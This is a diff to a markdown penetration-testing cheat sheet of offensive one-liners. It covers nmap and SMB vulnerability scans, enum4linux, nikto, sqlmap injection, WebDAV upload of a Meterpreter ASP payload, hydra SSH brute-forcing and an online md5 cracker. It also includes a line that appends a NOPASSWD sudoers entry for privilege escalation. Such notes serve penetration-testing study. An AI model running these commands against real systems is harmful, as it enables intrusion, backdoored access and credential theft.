@@ -12,6 +12,30 @@ nmap -n -A -sU -T4 <IP>
 nmap -p445 --script smb-vuln-ms17-010 <IP-range>
 ```
 
+### linux enumeration 
+```
+enum4linux <IP>
+```
+
+## WEB PENTEST
+
+### enumerate port 80
+```
+nikto -host http://<IP>
+```
+
+### sqlmap with request file
+```
+sqlmap -r search-test.txt -p param
+```
+### If PUT method is enabled
+```
+davtest -move -sendbd auto -url http://$ip
+cadaver <IP>
+cad> PUT met.asp met.asp
+```
+
+## ENCRYPTIONS AND DECRYPTIONS
 
 ### Password bruteforce using hydra
 ```
@@ -19,30 +43,12 @@ hydra -l bob -p password ssh://10.10.10.1 -t 4
 hydra -L user.txt -P pass.txt ssh://10.10.10.1 -t 4
 ```
 
-### linux enumeration 
-```
-enum4linux <IP>
-```
-
-### enumerate port 80
-```
-nikto -host http://<IP>
-```
-### sqlmap with request file
-```
-sqlmap -r search-test.txt -p param
-```
-
-## ENCRYPTIONS AND DECRYPTIONS
-
 ### Online md5 cracker
 ```
 https://www.md5online.org/md5-decrypt.html
 ```
 
-## PRIVILAGE ESCALATION
-
-### Linux
+## LINUX PRIVILAGE ESCALATION
 
 ### upgraded it to a pseudo-terminal using python
 ```
@@ -58,3 +64,6 @@ http://www.securitysift.com/download/linuxprivchecker.py
 ```
 echo 'bob ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
 ```
+
+## WINDOWS PRIVILAGE ESCALATION
+
